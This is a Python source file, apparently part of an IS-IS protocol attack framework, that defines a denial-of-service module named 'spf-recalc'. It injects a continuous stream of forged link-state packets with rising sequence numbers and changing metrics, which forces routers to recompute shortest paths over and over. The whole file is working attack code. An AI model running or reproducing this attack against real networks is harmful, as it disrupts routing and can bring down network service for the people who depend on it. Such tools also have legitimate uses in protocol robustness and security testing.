import time
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import DoSConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class SPFRecalcAttack(BaseAttack):
    name = "spf-recalc"
    description = "持续注入变化的 LSP 迫使路由器反复执行 SPF 计算"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
        )

    def launch(self) -> AttackResult:
        seq = 1
        deadline = time.time() + self.config.duration
        while time.time() < deadline:
            pkt = build_lsp_with_tlvs(
                sys_id=self.config.sys_id,
                lsp_id=f"{self.config.sys_id}.00-00",
                src_mac=self._src_mac, level=self.config.level,
                sequence=seq, remaining_lifetime=1200,
                metric=seq % 100 + 1,
            )
            self._sender.send_l2(pkt)
            seq = seq + 1 if seq < 0xFFFFFFFF else 1
            time.sleep(self.config.lsp_change_interval)
        return AttackResult(
            success=True, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"SPF 重计算: {self._sender.sent_count} LSPs injected",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 5
